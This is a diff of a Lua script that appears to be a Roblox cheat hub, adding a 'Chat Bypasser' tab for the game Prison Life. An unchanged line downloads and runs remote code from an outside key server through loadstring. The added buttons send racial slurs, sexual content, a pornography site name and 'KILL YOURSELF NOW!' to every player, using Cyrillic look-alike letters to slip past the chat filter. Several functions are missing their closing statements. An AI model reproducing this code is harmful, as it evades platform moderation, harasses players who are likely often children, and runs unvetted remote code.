@@ -195,3 +195,50 @@ getgenv().mainKey = "nil"
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
 
 end)
+
+-- Chat Bypasser
+
+-- Saving
+
+--game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("Hi", "All")
+
+-- bypass:NewButton("swear word", "...",function()
+
+local chatbypass = Window:NewTab("Prison Life")
+local bypass = chatbypass:NewSection("Bypass words combined")
+
+bypass:NewButton("ПiGGЕR Рussу Аss РОRN BIТСH ВООВS", "...",function()
+
+game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("ПiGGЕR Рussу Аss РОRN BIТСH ВООВS", "All")
+
+end)
+
+bypass:NewButton("GО АWАY АSSНОLЕ", "...",function()
+
+
+game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("GО АWАY АSSНОLЕ", "All")
+
+
+bypass:NewButton("i want you to КILL YОURSЕLF NОW!", "...",function()
+
+game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("i want you to КILL YОURSЕLF NОW!", "All")
+
+
+end)
+
+
+bypass:NewButton("blacked.com", "...",function()
+
+game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("blасkеd.соm", "All")
+
+end
+
+local bypassword = chatbypass:NewSection("Bypass words")
+
+bypassword:NewButton("ass", "...",function()
+
+game:GetService("ReplicatedStorage").SayMessageRequest:FireServer("аss", "All")
+
+end)
+
+local bypassword = chatbypass:NewSection("More coming soon!")
